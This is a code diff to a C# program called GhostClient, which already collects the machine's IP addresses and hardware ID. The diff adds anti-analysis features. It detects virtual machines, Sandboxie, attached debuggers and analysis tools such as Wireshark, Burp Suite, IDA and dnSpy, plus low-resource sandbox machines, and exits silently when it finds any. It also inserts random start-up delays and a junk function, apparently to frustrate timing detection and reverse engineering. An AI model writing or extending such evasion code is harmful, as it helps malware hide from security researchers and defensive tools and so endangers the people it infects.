@@ -44,6 +44,73 @@ namespace GhostClient
         private static string _publicIp = "";
         private static string _localIp = "";
         private static string _hardwareId = "";
+        private static bool _antiAnalysis = true;
+
+        // ── ANTI-ANALYSIS ──
+        static bool IsSandboxOrVM()
+        {
+            try
+            {
+                // Check for VirtualBox
+                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";
+                        string model = obj["Model"]?.ToString().ToLower() ?? "";
+                        if (manufacturer.Contains("virtualbox") || manufacturer.Contains("vmware") || manufacturer.Contains("qemu") ||
+                            model.Contains("virtualbox") || model.Contains("vmware") || model.Contains("virtual"))
+                            return true;
+                    }
+
+                // Check for Sandboxie
+                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\SbieDrv.sys"))
+                    return true;
+
+                // Check debugger presence
+                if (Debugger.IsAttached)
+                    return true;
+
+                // Check for common analysis tools
+                string[] badProcesses = new string[] {
+                    "wireshark", "fiddler", "procmon", "procexp", "vboxservice", "vboxtray",
+                    "vmtoolsd", "xenservice", "sandboxierpcss", "df5serv", "httpdebugger",
+                    "charles", "burpsuite", "ida", "ollydbg", "x64dbg", "dnspy", "ilspy"
+                };
+                foreach (var p in Process.GetProcesses())
+                {
+                    string name = p.ProcessName.ToLower();
+                    foreach (string bad in badProcesses)
+                        if (name.Contains(bad)) return true;
+                }
+
+                // Check low resources (sandbox)
+                long ram = 0;
+                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
+                    foreach (ManagementObject obj in searcher.Get())
+                        ram = Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024;
+                if (ram < 2000) return true; // Less than 2GB RAM
+
+                // Check CPU cores
+                if (Environment.ProcessorCount < 2) return true;
+
+                // Check disk size
+                DriveInfo systemDrive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
+                if (systemDrive.TotalSize < 40L * 1024 * 1024 * 1024) return true; // Less than 40GB
+
+                return false;
+            }
+            catch { return false; }
+        }
+
+        static int JunkFunction(int x)
+        {
+            int a = x * 42 + 7;
+            int b = (a >> 3) ^ 0x5A5A;
+            int c = b % 997;
+            for (int i = 0; i < 10; i++) { c = (c * 31 + i) % 10007; }
+            string d = "0x" + c.ToString("X4");
+            return d.GetHashCode() % 1000;
+        }
         private static float _cpu = 0;
         private static float _ramUsed = 0;
         private static float _ramTotal = 0;
@@ -495,6 +562,19 @@ namespace GhostClient
 
         static void Main(string[] args)
         {
+            // ── ANTI-ANALYSIS: Check for VM/Sandbox/Debugger ──
+            if (_antiAnalysis)
+            {
+                if (IsSandboxOrVM())
+                {
+                    Thread.Sleep(30000); // Delay to confuse sandboxes
+                    Environment.Exit(0);
+                    return;
+                }
+                // Random delay to evade timing-based detection
+                Thread.Sleep(new Random().Next(3000, 8000));
+            }
+
             // ── SINGLE INSTANCE ──
             if (SINGLE_INSTANCE)
             {
